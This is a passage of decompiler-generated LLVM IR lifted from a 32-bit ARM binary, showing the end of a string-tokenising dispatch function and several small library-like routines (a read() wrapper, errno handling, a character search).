  store i32 0, i32* %r3.global-to-local, align 4
  %v3_143bc = inttoptr i32 %v8_143e4 to i8*
  store i8 0, i8* %v3_143bc, align 1
  %v4_143bc = load i32, i32* %r2.global-to-local, align 4
  %v5_143bc = add i32 %v4_143bc, 1
  store i32 %v5_143bc, i32* %r2.global-to-local, align 4
  %v1_143c0 = inttoptr i32 %v5_143bc to i8*
  %v2_143c0 = load i8, i8* %v1_143c0, align 1
  %v3_143c0 = zext i8 %v2_143c0 to i32
  store i32 %v3_143c0, i32* %r1.global-to-local, align 4
  %v2_143c4 = icmp eq i8 %v2_143c0, 0
  br i1 %v2_143c4, label %dec_label_pc_14420, label %dec_label_pc_143cc

dec_label_pc_143cc:                               ; preds = %dec_label_pc_143c0.preheader, %dec_label_pc_143b8
  %v8_143e4 = phi i32 [ %v5_143bc, %dec_label_pc_143b8 ], [ %v0_143c020, %dec_label_pc_143c0.preheader ]
  %v1_143d4 = phi i32 [ %v3_143c0, %dec_label_pc_143b8 ], [ %v3_143c023, %dec_label_pc_143c0.preheader ]
  %v2_143d0 = load i32, i32* @global_var_1f4a0, align 4
  store i32 %v2_143d0, i32* %r3.global-to-local, align 4
  %v3_143d4 = mul nuw nsw i32 %v1_143d4, 2
  %v4_143d4 = add i32 %v3_143d4, %v2_143d0
  %v5_143d4 = inttoptr i32 %v4_143d4 to i8*
  %v6_143d4 = load i8, i8* %v5_143d4, align 1
  %v8_143d4 = zext i8 %v6_143d4 to i32
  store i32 %v8_143d4, i32* %r3.global-to-local, align 4
  %v1_143d8 = and i32 %v8_143d4, 32
  %v2_143d8 = icmp eq i32 %v1_143d8, 0
  br i1 %v2_143d8, label %dec_label_pc_143e0, label %dec_label_pc_143b8

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143cc
  %v0_143e0 = load i32, i32* @r6, align 4
  %v7_143e4 = icmp slt i32 %v0_143e0, 7
  br i1 %v7_143e4, label %bb76, label %dec_label_pc_143f4.preheader

bb76:                                             ; preds = %dec_label_pc_143e0
  %v9_143e4 = load i32, i32* @r4, align 4
  %v13_143e4 = mul i32 %v0_143e0, 4
  %v14_143e4 = add i32 %v9_143e4, %v13_143e4
  %v15_143e4 = inttoptr i32 %v14_143e4 to i32*
  store i32 %v8_143e4, i32* %v15_143e4, align 4
  %v8_143e8 = load i32, i32* @r6, align 4
  %v9_143e8 = add i32 %v8_143e8, 1
  store i32 %v9_143e8, i32* @r6, align 4
  %v0_143f425.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_143f4.preheader

dec_label_pc_143f4.preheader:                     ; preds = %bb76, %dec_label_pc_143e0
  %v0_143f425 = phi i32 [ %v0_143f425.pre, %bb76 ], [ %v8_143e4, %dec_label_pc_143e0 ]
  %v1_143f426 = inttoptr i32 %v0_143f425 to i8*
  %v2_143f427 = load i8, i8* %v1_143f426, align 1
  %v3_143f428 = zext i8 %v2_143f427 to i32
  store i32 %v3_143f428, i32* %r1.global-to-local, align 4
  %v2_143f829 = icmp eq i8 %v2_143f427, 0
  br i1 %v2_143f829, label %dec_label_pc_14414.loopexit, label %dec_label_pc_14400.lr.ph

dec_label_pc_14400.lr.ph:                         ; preds = %dec_label_pc_143f4.preheader
  %v2_14404.pre = load i32, i32* @global_var_1f4a0, align 4
  br label %dec_label_pc_14400

dec_label_pc_143f0:                               ; preds = %dec_label_pc_14400
  %v1_143f0 = add i32 %v0_143f0, 1
  store i32 %v1_143f0, i32* %r2.global-to-local, align 4
  %v1_143f4 = inttoptr i32 %v1_143f0 to i8*
  %v2_143f4 = load i8, i8* %v1_143f4, align 1
  %v3_143f4 = zext i8 %v2_143f4 to i32
  store i32 %v3_143f4, i32* %r1.global-to-local, align 4
  %v2_143f8 = icmp eq i8 %v2_143f4, 0
  br i1 %v2_143f8, label %dec_label_pc_14414.loopexit, label %dec_label_pc_14400

dec_label_pc_14400:                               ; preds = %dec_label_pc_14400.lr.ph, %dec_label_pc_143f0
  %v0_143f0 = phi i32 [ %v0_143f425, %dec_label_pc_14400.lr.ph ], [ %v1_143f0, %dec_label_pc_143f0 ]
  %v1_14408 = phi i32 [ %v3_143f428, %dec_label_pc_14400.lr.ph ], [ %v3_143f4, %dec_label_pc_143f0 ]
  store i32 %v2_14404.pre, i32* %r3.global-to-local, align 4
  %v3_14408 = mul nuw nsw i32 %v1_14408, 2
  %v4_14408 = add i32 %v3_14408, %v2_14404.pre
  %v5_14408 = inttoptr i32 %v4_14408 to i8*
  %v6_14408 = load i8, i8* %v5_14408, align 1
  %v8_14408 = zext i8 %v6_14408 to i32
  store i32 %v8_14408, i32* %r3.global-to-local, align 4
  %v1_1440c = and i32 %v8_14408, 32
  %v2_1440c = icmp eq i32 %v1_1440c, 0
  br i1 %v2_1440c, label %dec_label_pc_143f0, label %dec_label_pc_14414.loopexit

dec_label_pc_14414.loopexit:                      ; preds = %dec_label_pc_14400, %dec_label_pc_143f0, %dec_label_pc_143f4.preheader
  %v0_14414 = phi i32 [ %v0_143f425, %dec_label_pc_143f4.preheader ], [ %v0_143f0, %dec_label_pc_14400 ], [ %v1_143f0, %dec_label_pc_143f0 ]
  %v1_14414 = inttoptr i32 %v0_14414 to i8*
  %v2_14414 = load i8, i8* %v1_14414, align 1
  %v3_14414 = zext i8 %v2_14414 to i32
  store i32 %v3_14414, i32* %r3.global-to-local, align 4
  %v2_14418 = icmp eq i8 %v2_14414, 0
  br i1 %v2_14418, label %dec_label_pc_14420, label %dec_label_pc_143c0.preheader

dec_label_pc_143c0.preheader:                     ; preds = %dec_label_pc_14414.preheader, %dec_label_pc_14414.loopexit
  %v0_143c020 = phi i32 [ %v0_14414, %dec_label_pc_14414.loopexit ], [ %v0_1441430, %dec_label_pc_14414.preheader ]
  %v1_143c021 = inttoptr i32 %v0_143c020 to i8*
  %v2_143c022 = load i8, i8* %v1_143c021, align 1
  %v3_143c023 = zext i8 %v2_143c022 to i32
  store i32 %v3_143c023, i32* %r1.global-to-local, align 4
  %v2_143c424 = icmp eq i8 %v2_143c022, 0
  br i1 %v2_143c424, label %dec_label_pc_14420, label %dec_label_pc_143cc

dec_label_pc_14420:                               ; preds = %dec_label_pc_14414.loopexit, %dec_label_pc_143c0.preheader, %dec_label_pc_143b8, %dec_label_pc_14414.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14424 = load i32, i32* @r6, align 4
  %v1_14428 = load i32, i32* @r4, align 4
  %v5_14428 = mul i32 %v0_14424, 4
  %v6_14428 = add i32 %v1_14428, %v5_14428
  %v7_14428 = inttoptr i32 %v6_14428 to i32*
  store i32 0, i32* %v7_14428, align 4
  %v7_1442c = icmp sgt i32 %v0_14424, 1
  br i1 %v7_1442c, label %dec_label_pc_14430, label %dec_label_pc_144d4

dec_label_pc_14430:                               ; preds = %dec_label_pc_14420
  %v2_14430 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_14430, i32* %r0.global-to-local, align 4
  %v7_14434 = icmp eq i32 %v2_14430, 1
  br i1 %v7_14434, label %dec_label_pc_14508, label %dec_label_pc_1443c

dec_label_pc_1443c:                               ; preds = %dec_label_pc_14430
  %v7_1443c = icmp eq i32 %v2_14430, 2
  br i1 %v7_1443c, label %dec_label_pc_14448, label %dec_label_pc_14474.preheader

dec_label_pc_14474.preheader:                     ; preds = %dec_label_pc_1443c
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_14474

dec_label_pc_14448:                               ; preds = %dec_label_pc_1443c
  store i32 %v0_1420c, i32* %r0.global-to-local, align 4
  %v0_1444c = load i32, i32* @r4, align 4
  %v1_1444c = inttoptr i32 %v0_1444c to i32*
  %v2_1444c = load i32, i32* %v1_1444c, align 4
  store i32 %v2_1444c, i32* @r1, align 4
  %v3_14450 = call i32 @function_13640(i8* %v2_14450, i32 %v2_1444c)
  store i32 %v3_14450, i32* %r0.global-to-local, align 4
  %v2_14454 = icmp eq i32 %v3_14450, 0
  br i1 %v2_14454, label %dec_label_pc_14484, label %dec_label_pc_144d4

dec_label_pc_14460:                               ; preds = %dec_label_pc_14474
  %v0_14460 = load i32, i32* @r4, align 4
  %v4_14460 = mul i32 %v1_14460, 4
  %v5_14460 = add i32 %v0_14460, %v4_14460
  %v6_14460 = inttoptr i32 %v5_14460 to i32*
  %v7_14460 = load i32, i32* %v6_14460, align 4
  store i32 %v7_14460, i32* %r1.global-to-local, align 4
  %v3_14464 = call i32 @function_f0f4(i8* %v2_14450, i32 %v7_14460)
  store i32 %v3_14464, i32* %r0.global-to-local, align 4
  %v2_14468 = icmp eq i32 %v3_14464, 0
  %v0_1446c = load i32, i32* @r5, align 4
  %v1_1446c = add i32 %v0_1446c, 1
  store i32 %v1_1446c, i32* @r5, align 4
  br i1 %v2_14468, label %dec_label_pc_14484, label %dec_label_pc_14474

dec_label_pc_14474:                               ; preds = %dec_label_pc_14474.preheader, %dec_label_pc_14460
  %v1_14460 = phi i32 [ 1, %dec_label_pc_14474.preheader ], [ %v1_1446c, %dec_label_pc_14460 ]
  %v1_14474 = load i32, i32* @r6, align 4
  store i32 %v0_1420c, i32* %r0.global-to-local, align 4
  %v5_1447c = icmp slt i32 %v1_14460, %v1_14474
  br i1 %v5_1447c, label %dec_label_pc_14460, label %dec_label_pc_144d4

dec_label_pc_14484:                               ; preds = %dec_label_pc_14460, %dec_label_pc_14448
  store i32 %v0_14204, i32* %r1.global-to-local, align 4
  br i1 %v7_14488, label %dec_label_pc_14490, label %dec_label_pc_144ac

dec_label_pc_14490:                               ; preds = %dec_label_pc_14484
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_14494 = load i32, i32* @r7, align 4
  store i32 %v0_14494, i32* %r2.global-to-local, align 4
  %v0_14498 = load i32, i32* @r4, align 4
  %v1_14498 = inttoptr i32 %v0_14498 to i32*
  %v2_14498 = load i32, i32* %v1_14498, align 4
  store i32 %v2_14498, i32* %r1.global-to-local, align 4
  %v3_1449c = inttoptr i32 %v2_14498 to i8*
  %v4_1449c = call i32 @function_138fc(i32 2, i8* %v3_1449c, i32 %v0_14494)
  store i32 %v4_1449c, i32* %r0.global-to-local, align 4
  %v5_144a4 = icmp sgt i32 %v4_1449c, 0
  br i1 %v5_144a4, label %dec_label_pc_142e0, label %dec_label_pc_144d0

dec_label_pc_144ac:                               ; preds = %dec_label_pc_14484
  store i32 %v0_14204, i32* %r2.global-to-local, align 4
  br i1 %v7_144b0, label %dec_label_pc_144b8, label %dec_label_pc_144d0

dec_label_pc_144b8:                               ; preds = %dec_label_pc_144ac
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_144bc = load i32, i32* @r4, align 4
  %v1_144bc = inttoptr i32 %v0_144bc to i32*
  %v2_144bc = load i32, i32* %v1_144bc, align 4
  store i32 %v2_144bc, i32* %r1.global-to-local, align 4
  store i32 %v0_14388, i32* %r2.global-to-local, align 4
  %v3_144c4 = inttoptr i32 %v2_144bc to i8*
  %v4_144c4 = call i32 @function_138fc(i32 10, i8* %v3_144c4, i32 %v0_14388)
  store i32 %v4_144c4, i32* %r0.global-to-local, align 4
  %v5_144cc = icmp sgt i32 %v4_144c4, 0
  br i1 %v5_144cc, label %dec_label_pc_14324, label %dec_label_pc_144d0

dec_label_pc_144d0:                               ; preds = %dec_label_pc_14490, %dec_label_pc_144ac, %dec_label_pc_144b8
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_144d4

dec_label_pc_144d4:                               ; preds = %dec_label_pc_14474, %dec_label_pc_14448, %dec_label_pc_14420, %dec_label_pc_144d0, %dec_label_pc_1437c
  %v0_144d4 = load i32, i32* @fp, align 4
  store i32 %v0_144d4, i32* %r0.global-to-local, align 4
  %v0_144d8 = load i32, i32* @r8, align 4
  store i32 %v0_144d8, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_144e0 = call i32 @function_e500(i32 %v0_144d4, i32 %v0_144d8, i32 %stack_var_-52.0)
  store i32 %v3_144e0, i32* %r0.global-to-local, align 4
  %v2_144e4 = icmp eq i32 %v3_144e0, 0
  br i1 %v2_144e4, label %dec_label_pc_144ec, label %dec_label_pc_14394

dec_label_pc_144ec:                               ; preds = %dec_label_pc_144d4, %dec_label_pc_14324, %dec_label_pc_142e0
  %v2_144ec = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_144ec, i32* %r3.global-to-local, align 4
  %v7_144f0 = icmp eq i32 %v2_144ec, 1
  br i1 %v7_144f0, label %dec_label_pc_14508, label %dec_label_pc_144f8

dec_label_pc_144f8:                               ; preds = %dec_label_pc_144ec
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_144fc = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_144fc = call i32 @function_cc14(i8* %v1_144fc)
  store i32 %v2_144fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14508

dec_label_pc_14504:                               ; preds = %dec_label_pc_14220, %bb74, %dec_label_pc_14274, %dec_label_pc_1426c, %dec_label_pc_14260, %dec_label_pc_1424c, %dec_label_pc_14230
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_14508

dec_label_pc_14508:                               ; preds = %dec_label_pc_14430, %dec_label_pc_144ec, %dec_label_pc_144f8, %dec_label_pc_142c8, %dec_label_pc_14504
  %v0_14508 = load i32, i32* @sl, align 4
  store i32 %v0_14508, i32* %r0.global-to-local, align 4
  store i32 %v3_141f0, i32* @r4, align 4
  store i32 %v6_141f0, i32* @r5, align 4
  store i32 %v12_141f0, i32* @r7, align 4
  store i32 %v15_141f0, i32* @r8, align 4
  store i32 %v21_141f0, i32* @sl, align 4
  store i32 %v24_141f0, i32* @fp, align 4
  ret i32 %v0_14508

; uselistorder directives
  uselistorder i32 %v1_14460, { 1, 0 }
  uselistorder i32 %v0_14424, { 1, 0 }
  uselistorder i32 %v3_143c023, { 1, 0 }
  uselistorder i32 %v0_143c020, { 1, 0 }
  uselistorder i32 %v2_1439c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_1429c, { 1, 0 }
  uselistorder i32 %v0_14260, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14244, { 1, 0 }
  uselistorder i32 %v0_14210, { 1, 0, 2 }
  uselistorder i32 %v0_14204, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14200, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 18, 10, 19, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 13, 8, 14, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 23, 22, 13, 8, 15, 14, 16, 1, 19, 17, 18, 21, 20, 4, 5, 6, 9, 10, 11, 12, 24, 0, 25 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_cc14, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 (i32, i32, i32)* @function_e500, { 2, 1, 0, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_f0f4, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 7, { 2, 9, 10, 4, 5, 6, 0, 13, 11, 1, 7, 8, 12, 3 }
  uselistorder i32* @global_var_1f4a0, { 0, 6, 2, 7, 1, 3, 4, 8, 5 }
  uselistorder i32 10, { 5, 6, 33, 7, 8, 34, 35, 36, 37, 38, 25, 14, 26, 13, 27, 28, 15, 29, 30, 39, 4, 40, 41, 42, 43, 12, 16, 44, 17, 45, 46, 18, 47, 19, 20, 0, 9, 10, 21, 24, 3, 48, 49, 11, 1, 31, 22, 32, 2, 23 }
  uselistorder i32 12, { 28, 29, 30, 0, 31, 7, 32, 18, 11, 12, 3, 33, 13, 9, 63, 64, 65, 66, 67, 68, 10, 69, 70, 71, 72, 73, 74, 14, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 5, 4, 44, 45, 46, 15, 19, 23, 62, 47, 48, 49, 1, 50, 8, 51, 2, 52, 16, 53, 54, 55, 56, 75, 6, 57, 58, 59, 60, 17, 22, 20, 21, 24, 25, 26, 27, 61 }
  uselistorder i32* @sb, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 39, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38 }
  uselistorder i32 80, { 0, 4, 5, 6, 1, 7, 2, 3 }
  uselistorder i32 48, { 9, 5, 6, 7, 8, 10, 2, 11, 12, 13, 3, 4, 14, 15, 16, 17, 18, 1, 0, 19 }
  uselistorder i32 36, { 4, 5, 6, 8, 9, 10, 11, 3, 1, 7, 2, 0, 12, 13, 14 }
  uselistorder i32 56, { 2, 3, 5, 6, 4, 1, 0, 7, 8 }
  uselistorder i32 44, { 2, 3, 4, 5, 6, 10, 1, 7, 8, 0, 9 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 30, 31, 32, 0, 33, 34, 26, 4, 3, 6, 5, 8, 7, 35, 36, 22, 23, 20, 37, 24, 38, 39, 55, 29, 1, 15, 21, 40, 41, 42, 43, 16, 44, 2, 25, 45, 46, 47, 48, 49, 17, 50, 27, 28, 51, 52, 53, 54, 10, 9, 12, 11, 18, 19, 14, 13 }
  uselistorder i32* @fp, { 32, 35, 33, 1, 34, 36, 37, 38, 39, 0, 41, 40, 42, 43, 44, 45, 2, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 3, 4, 5, 6, 11, 12, 13, 14, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 71, 25, 7, 8, 9, 10, 65, 69, 70, 66, 67, 68, 15, 16, 17 }
  uselistorder i32* @sl, { 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 14, 15, 16, 17, 2, 3, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 1, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32* @r8, { 8, 9, 10, 11, 12, 13, 14, 3, 4, 5, 15, 16, 17, 0, 18, 19, 20, 21, 22, 1, 23, 24, 25, 26, 27, 28, 84, 85, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 6, 7, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 2, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i32* @r7, { 20, 22, 23, 21, 24, 25, 26, 27, 28, 29, 6, 7, 8, 9, 10, 11, 12, 1, 30, 32, 31, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 94, 13, 14, 2, 15, 16, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 33, 3, 34, 35, 4, 5, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 0, 17, 18, 92, 93, 19, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91 }
  uselistorder label %dec_label_pc_14508, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14504, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_144d4, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_144d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14474, { 1, 0 }
  uselistorder label %dec_label_pc_14420, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_143c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_14400, { 1, 0 }
  uselistorder label %dec_label_pc_1437c, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_14230, { 1, 0 }
}

define i32 @function_14518(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_14518:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1455c, label %dec_label_pc_14548

dec_label_pc_14548:                               ; preds = %dec_label_pc_14518
  %v0_14548 = call i32 @function_cc08()
  %v0_1454c = load i32, i32* %r4.global-to-local, align 4
  %v1_1454c = sub i32 0, %v0_1454c
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14554 = inttoptr i32 %v0_14548 to i32*
  store i32 %v1_1454c, i32* %v2_14554, align 4
  %v0_14564.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14564

dec_label_pc_1455c:                               ; preds = %dec_label_pc_14518
  %v2_1455c = icmp eq i32 %arg1, 0
  br i1 %v2_1455c, label %dec_label_pc_14570, label %dec_label_pc_14564

dec_label_pc_14564:                               ; preds = %dec_label_pc_1455c, %dec_label_pc_14548
  %v0_14564 = phi i32 [ %arg1, %dec_label_pc_1455c ], [ %v0_14564.pre, %dec_label_pc_14548 ]
  br label %dec_label_pc_14574

dec_label_pc_14570:                               ; preds = %dec_label_pc_1455c
  br label %dec_label_pc_14574

dec_label_pc_14574:                               ; preds = %dec_label_pc_14564, %dec_label_pc_14570
  %v14_14578 = phi i32 [ %v0_14564, %dec_label_pc_14564 ], [ %tmp9, %dec_label_pc_14570 ]
  ret i32 %v14_14578

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_14574, { 1, 0 }
}

define i32 @function_1457c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1457c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1457c = load i32, i32* @r4, align 4
  store i32 %v3_1457c, i32* %stack_var_-8, align 4
  %v1_14580 = load i32, i32* @r1, align 4
  %v2_14580 = inttoptr i32 %v1_14580 to i32*
  %v3_14580 = load i32, i32* @r2, align 4
  %v4_14580 = call i32 @read(i32 %arg1, i32* %v2_14580, i32 %v3_14580)
  store i32 %v4_14580, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_14580, -4095
  br i1 %tmp, label %dec_label_pc_145a0, label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %dec_label_pc_1457c
  %v0_14590 = call i32 @function_cc08()
  %v0_14594 = load i32, i32* %r4.global-to-local, align 4
  %v1_14594 = sub i32 0, %v0_14594
  %v2_14598 = inttoptr i32 %v0_14590 to i32*
  store i32 %v1_14594, i32* %v2_14598, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_145a0

dec_label_pc_145a0:                               ; preds = %dec_label_pc_1457c, %dec_label_pc_14590
  %v0_145a0 = phi i32 [ %v4_14580, %dec_label_pc_1457c ], [ -1, %dec_label_pc_14590 ]
  %v2_145a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_145a4, i32* @r4, align 4
  ret i32 %v0_145a0

; uselistorder directives
  uselistorder i32 %v4_14580, { 1, 0, 2 }
  uselistorder i32 ()* @function_cc08, { 42, 41, 40, 38, 37, 36, 39, 21, 20, 35, 34, 57, 33, 32, 31, 30, 29, 56, 12, 11, 55, 10, 49, 9, 8, 7, 6, 54, 53, 5, 4, 3, 70, 48, 47, 46, 45, 69, 68, 28, 27, 66, 44, 26, 61, 25, 60, 59, 24, 23, 22, 0, 1, 19, 18, 52, 51, 50, 17, 43, 58, 14, 2, 67, 13, 16, 15, 65, 64, 63, 62 }
  uselistorder label %dec_label_pc_145a0, { 1, 0 }
}

define i32 @function_145a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_145a8:
  %v1_145b0 = icmp slt i32 %arg1, 0
  br i1 %v1_145b0, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_145a8
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_145a8
  %v2_145b0 = mul i32 %arg1, 2
  %v2_145bc = load i32, i32* bitcast (i32** @global_var_1f4a8.404 to i32*), align 4
  %v2_145c0 = add i32 %v2_145bc, %v2_145b0
  %v3_145c4 = inttoptr i32 %v2_145c0 to i8*
  %v4_145c4 = load i8, i8* %v3_145c4, align 1
  %v6_145c4 = zext i8 %v4_145c4 to i32
  %v1_145c8 = add i32 %v2_145c0, 1
  %v2_145c8 = inttoptr i32 %v1_145c8 to i8*
  %v3_145c8 = load i8, i8* %v2_145c8, align 1
  %v4_145c8 = zext i8 %v3_145c8 to i32
  %v3_145cc = mul nuw i32 %v4_145c8, 16777216
  %v4_145d0 = sdiv i32 %v3_145cc, 65536
  %v5_145d0 = or i32 %v4_145d0, %v6_145c4
  ret i32 %v5_145d0

; uselistorder directives
  uselistorder i32 %v2_145c0, { 1, 0 }
}

define i32 @function_145dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_145dc:
  %v6_145dc = load i32, i32* @r5, align 4
  %v9_145dc = load i32, i32* @r6, align 4
  %v1_145e0 = urem i32 %arg1, 256
  br label %dec_label_pc_14600

dec_label_pc_145e8:                               ; preds = %dec_label_pc_14600
  %v3_145e8 = load i8, i8* %.0, align 1
  %v4_145e8 = zext i8 %v3_145e8 to i32
  %v9_145ec = icmp eq i32 %v4_145e8, %v1_145e0
  br i1 %v9_145ec, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_145e8
  ret i32 %v1_14600

bb24:                                             ; preds = %dec_label_pc_145e8
  %v2_145f4 = icmp eq i8 %v3_145e8, 0
  %v2_145f8 = add i32 %v1_14600, 1
  %v3_145f8 = inttoptr i32 %v2_145f8 to i8*
  br i1 %v2_145f4, label %dec_label_pc_146d4, label %dec_label_pc_14600

dec_label_pc_14600:                               ; preds = %bb24, %dec_label_pc_145dc
  %.0 = phi i8* [ undef, %dec_label_pc_145dc ], [ %v3_145f8, %bb24 ]
  %v1_14600 = ptrtoint i8* %.0 to i32
  %v2_14600 = urem i32 %v1_14600, 4
  %v3_14600 = icmp eq i32 %v2_14600, 0
  br i1 %v3_14600, label %dec_label_pc_14608, label %dec_label_pc_145e8

dec_label_pc_14608:                               ; preds = %dec_label_pc_14600
  %v4_14608 = mul nuw nsw i32 %v1_145e0, 256
  %v5_14608 = or i32 %v4_14608, %v1_145e0
  %v4_14610 = mul i32 %v5_14608, 65536
  %v5_14610 = or i32 %v4_14610, %v5_14608
  br label %dec_label_pc_14614

dec_label_pc_14614:                               ; preds = %dec_label_pc_146cc, %dec_label_pc_14654, %dec_label_pc_14608
  %v0_14678 = phi i32 [ %v1_14600, %dec_label_pc_14608 ], [ %v4_14614, %dec_label_pc_14654 ], [ %v4_14614, %dec_label_pc_146cc ]
  %v1_14614 = inttoptr i32 %v0_14678 to i32*
  %v2_14614 = load i32, i32* %v1_14614, align 4
  %v4_14614 = add i32 %v0_14678, 4
  %v2_1461c = xor i32 %v2_14614, %v5_14610
  %v2_14628 = add i32 %v2_14614, 2130640639
  %v1_1462c = sub i32 -1, %v2_14614
  %v2_14630 = xor i32 %v2_14628, %v1_1462c
  %v2_14634 = add i32 %v2_1461c, 2130640639
  %v1_1463c = sub i32 -1, %v2_1461c
  %v2_14640 = and i32 %v2_14630, -2130640640
  %v2_14644 = xor i32 %v2_14634, %v1_1463c
  %v2_14648 = icmp eq i32 %v2_14640, 0
  %v2_1464c = and i32 %v2_14644, -2130640640
  store i32 %v2_1464c, i32* @lr, align 4
  br i1 %v2_14648, label %dec_label_pc_14654, label %dec_label_pc_1465c

dec_label_pc_14654:                               ; preds = %dec_label_pc_14614
  %v2_14654 = icmp eq i32 %v2_1464c, 0
  br i1 %v2_14654, label %dec_label_pc_14614, label %dec_label_pc_1465c

dec_label_pc_1465c:                               ; preds = %dec_label_pc_14614, %dec_label_pc_14654
  %v2_1465c = inttoptr i32 %v0_14678 to i8*
  %v3_1465c = load i8, i8* %v2_1465c, align 1
  %v4_1465c = zext i8 %v3_1465c to i32
  %v1_14664 = add i32 %v0_14678, 1
  %v1_14668 = add i32 %v0_14678, 2
  %v9_1466c = icmp eq i32 %v4_1465c, %v1_145e0
  %v1_14670 = add i32 %v0_14678, 3
  br i1 %v9_1466c, label %dec_label_pc_14678, label %dec_label_pc_14680

dec_label_pc_14678:                               ; preds = %dec_label_pc_1465c
  store i32 %v6_145dc, i32* @r5, align 4
  store i32 %v9_145dc, i32* @r6, align 4
  ret i32 %v0_14678

dec_label_pc_14680:                               ; preds = %dec_label_pc_1465c
  %v2_14680 = icmp eq i8 %v3_1465c, 0
  br i1 %v2_14680, label %dec_label_pc_146d4, label %dec_label_pc_14688

dec_label_pc_14688:                               ; preds = %dec_label_pc_14680
  %v2_14688 = inttoptr i32 %v1_14664 to i8*
